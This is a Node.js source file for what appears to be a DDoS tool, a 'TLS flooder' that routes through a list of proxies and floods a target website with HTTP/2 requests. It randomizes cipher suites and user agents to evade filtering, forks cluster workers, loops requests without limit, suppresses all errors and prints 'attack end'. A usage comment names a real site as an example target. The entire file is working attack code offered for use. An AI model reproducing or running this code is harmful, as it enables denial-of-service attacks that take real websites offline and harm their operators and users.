
// node tlsflooder.js https://website.com time proxyfile threads
// node private.js https://yandex.ru/ 1200 http.txt 64 120

const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const crypto = require('crypto');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const request = require('request')


const path = require("path");
const fileName = __filename;
const file = path.basename(fileName);
if (process.argv.length < 6){
    console.log('node '+ file +' https://website.com time proxyfile threads rate(default 120) cookie');
    //console.log(process.argv.length);
    process.exit(0);
}

let payload = {};
var rate = Number(process.argv[6])
try {
var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch(error){
console.log('proxy file not found.');
process.exit();
}

try {
var objetive = process.argv[2];
var parsed = url.parse(objetive);
} catch(error){
    console.log('fail to load target data.');
    process.exit();
}
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
 ];

 let SignalsList = sigalgs.join(':');

const cplist = [
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

var cipper = cplist[Math.floor(Math.random() * cplist.length)];

 try {
var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
 } catch(error){
     console.log('fail to load user-agents')
 }
class TlsBuilder {
    constructor (socket){
        this.curve = "GREASE:X25519:x25519"; // Default
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
    }

    Alert()

    {
        setTimeout( async () => {
        console.log(``);
        }, 1);
    }


    http2TUNNEL(socket){
        socket.setKeepAlive(true, 10000);
        socket.setTimeout(5000);
        payload[":method"] = "GET";
        payload["Referer"] = objetive;
        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload['client-control'] = 'max-age=43200, s-max-age=43200';
        payload['Upgrade-Insecure-Requests'] = 1;
        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
        payload['Accept-Encoding'] = 'gzip, deflate, br';
        payload['Accept-Language'] = 'en-US,en;q=0.9'
        payload[":path"] = parsed.path;
        payload['Cookie'] = process.argv[7];

        const tunnel = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket: socket,
                ciphers: tls.getCiphers().join(':')+cipper,
                secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                echdCurve: this.curve,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt, 
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
            }, () => {
                
        for (let i = 0; i < 12; i++) {

            setInterval(async () => {
                await tunnel.request(payload).close()
            });
        }
            })
     });
    }
}

BuildTLS = new TlsBuilder();
BuildTLS.Alert();
 setTimeout( async () => {
        console.log(BuildTLS);
 }, 1);
const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });

function Runner(){

for (let i = 0; i < 48; i++) {
var proxy = proxies[Math.floor(Math.random() * proxies.length)];
proxy = proxy.split(':');
                    
var req = http.get({ 
        host: proxy[0],
        port: proxy[1],
        timeout: 1000,
        method: "CONNECT",
        agent: keepAliveAgent,
        path: parsed.host + ":443"
        });
        req.end();
     
        req.on('connect', (__, socket) =>  {
            BuildTLS.http2TUNNEL(socket);
        });

        req.on('end', () => {
            req.resume()
            req.close();
          });
        
    }
}

setInterval(Runner)


if (cluster.isMaster){
    for (let i = 0; i < process.argv[5]; i++){
     cluster.fork();
}
};

setTimeout(function(){
    console.log('attack end')
    process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});